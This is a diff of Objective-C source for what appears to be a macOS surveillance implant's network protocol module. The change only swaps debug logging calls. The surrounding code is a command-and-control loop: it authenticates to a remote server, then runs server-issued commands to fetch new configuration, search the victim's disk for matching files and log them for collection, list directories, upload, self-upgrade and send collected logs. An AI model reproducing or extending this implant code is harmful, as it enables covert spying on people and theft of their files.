@@ -25,7 +25,8 @@
 #import "RCSMFileSystemManager.h"
 #import "RCSMTaskManager.h"
 
-//#define DEBUG_PROTO
+#import "RCSMLogger.h"
+#import "RCSMDebug.h"
 
 
 @implementation RESTNetworkProtocol
@@ -37,7 +38,7 @@
       if (aConfiguration == nil)
         {
 #ifdef DEBUG_PROTO
-          errorLog(ME, @"configuration is nil");
+          errorLog(@"configuration is nil");
 #endif
           
           [self release];
@@ -56,10 +57,10 @@
                                + 1];*/
       
 #ifdef DEBUG_PROTO
-      debugLog(ME, @"minDelay  : %d", mMinDelay);
-      debugLog(ME, @"maxDelay  : %d", mMaxDelay);
-      debugLog(ME, @"bandWidth : %d", mBandwidthLimit);
-      debugLog(ME, @"host      : %@", host);
+      warnLog(@"minDelay  : %d", mMinDelay);
+      warnLog(@"maxDelay  : %d", mMaxDelay);
+      warnLog(@"bandWidth : %d", mBandwidthLimit);
+      warnLog(@"host      : %@", host);
 #endif
       
       NSString *_url;
@@ -83,7 +84,7 @@
 - (BOOL)perform
 {
 #ifdef DEBUG_PROTO
-  infoLog(ME, @"");
+  infoLog(@"");
 #endif
   
   NSAutoreleasePool *outerPool = [[NSAutoreleasePool alloc] init];
@@ -97,7 +98,7 @@
   if ([authOP perform] == NO)
     {
 #ifdef DEBUG_PROTO
-      errorLog(ME, @"Error on AUTH");
+      errorLog(@"Error on AUTH");
 #endif
       
       [authOP release];
@@ -114,7 +115,7 @@
   if ([idOP perform] == NO)
     {
 #ifdef DEBUG_PROTO
-      errorLog(ME, @"Error on ID");
+      errorLog(@"Error on ID");
 #endif
       
       [idOP release];
@@ -128,7 +129,7 @@
   [idOP release];
   
 #ifdef DEBUG_PROTO
-  infoLog(ME, @"commands available: %@", commandList);
+  infoLog(@"commands available: %@", commandList);
 #endif
   
   int i = 0;
@@ -146,7 +147,7 @@
             if ([confOP perform] == NO)
               {
 #ifdef DEBUG_PROTO
-                errorLog(ME, @"Error on CONF");
+                errorLog(@"Error on CONF");
 #endif
               }
             
@@ -159,7 +160,7 @@
             if ([downOP perform] == NO)
               {
 #ifdef DEBUG_PROTO
-                errorLog(ME, @"Error on DOWNLOAD");
+                errorLog(@"Error on DOWNLOAD");
 #endif
               }
             else
@@ -173,14 +174,14 @@
                     for (NSString *fileMask in files)
                       {
 #ifdef DEBUG_PROTO
-                        infoLog(ME, @"(PROTO_DOWNLOAD) Logging %@", fileMask);
+                        infoLog(@"(PROTO_DOWNLOAD) Logging %@", fileMask);
 #endif
                         
                         NSArray *filesFound = [fsManager searchFilesOnHD: fileMask];
                         if (filesFound == nil)
                           {
 #ifdef DEBUG_PROTO
-                            errorLog(ME, @"fileMask (%@) didn't match any files");
+                            errorLog(@"fileMask (%@) didn't match any files");
 #endif
                             continue;
                           }
@@ -188,7 +189,7 @@
                         for (NSString *file in filesFound)
                           {
 #ifdef DEBUG_PROTO
-                            infoLog(ME, @"createLogForFile (%@)", file);
+                            infoLog(@"createLogForFile (%@)", file);
 #endif
                             [fsManager logFileAtPath: file];
                           }
@@ -199,7 +200,7 @@
                 else
                   {
 #ifdef DEBUG_PROTO
-                    errorLog(ME, @"(PROTO_DOWNLOAD) no file available");
+                    errorLog(@"(PROTO_DOWNLOAD) no file available");
 #endif
                   }
               }
@@ -214,7 +215,7 @@
             if ([upOP perform] == NO)
               {
 #ifdef DEBUG_PROTO
-                errorLog(ME, @"Error on UPLOAD");
+                errorLog(@"Error on UPLOAD");
 #endif
               }
             
@@ -228,7 +229,7 @@
             if ([upgradeOP perform] == NO)
               {
 #ifdef DEBUG_PROTO
-                errorLog(ME, @"Error on UPGRADE");
+                errorLog(@"Error on UPGRADE");
 #endif
               }
             
@@ -241,14 +242,14 @@
             if ([fsOP perform] == NO)
               {
 #ifdef DEBUG_PROTO
-                errorLog(ME, @"Error on FS");
+                errorLog(@"Error on FS");
 #endif
               }
             else
               {
                 NSArray *paths = [fsOP getPaths];
 #ifdef DEBUG_PROTO
-                infoLog(ME, @"paths: %@", paths);
+                infoLog(@"paths: %@", paths);
 #endif
                 
                 if ([paths count] > 0)
@@ -261,8 +262,8 @@
                         uint32_t depth = [[dictionary objectForKey: @"depth"] unsignedIntValue];
                         
 #ifdef DEBUG_PROTO
-                        infoLog(ME, @"(PROTO_FS) path : %@", path);
-                        infoLog(ME, @"(PROTO_FS) depth: %d", depth);
+                        infoLog(@"(PROTO_FS) path : %@", path);
+                        infoLog(@"(PROTO_FS) depth: %d", depth);
 #endif
                         
                         [fsManager logDirContent: path
@@ -274,7 +275,7 @@
                 else
                   {
 #ifdef DEBUG_PROTO
-                    errorLog(ME, @"(PROTO_FS) no path availalble");
+                    errorLog(@"(PROTO_FS) no path availalble");
 #endif
                   }
               }
@@ -284,7 +285,7 @@
         default:
           {
 #ifdef DEBUG_PROTO
-            errorLog(ME, @"Received an unknown command (%d)", command);
+            errorLog(@"Received an unknown command (%d)", command);
 #endif
           } break;
         }
@@ -299,7 +300,7 @@
   if ([logOP perform] == NO)
     {
 #ifdef DEBUG_PROTO
-      errorLog(ME, @"Error on LOG");
+      errorLog(@"Error on LOG");
 #endif
     }
   
@@ -310,7 +311,7 @@
   if ([byeOP perform] == NO)
     {
 #ifdef DEBUG_PROTO
-      errorLog(ME, @"WTF error on BYE?!");
+      errorLog(@"WTF error on BYE?!");
 #endif
     }
   [byeOP release];
@@ -324,14 +325,14 @@
   if (_taskManager.mShouldReloadConfiguration == YES)
     {
 #ifdef DEBUG_PROTO
-      warnLog(ME, @"Loading new configuration");
+      warnLog(@"Loading new configuration");
 #endif
       [_taskManager reloadConfiguration];
     }
   else
     {
 #ifdef DEBUG_PROTO
-      warnLog(ME, @"No new configuration");
+      warnLog(@"No new configuration");
 #endif
     }
   
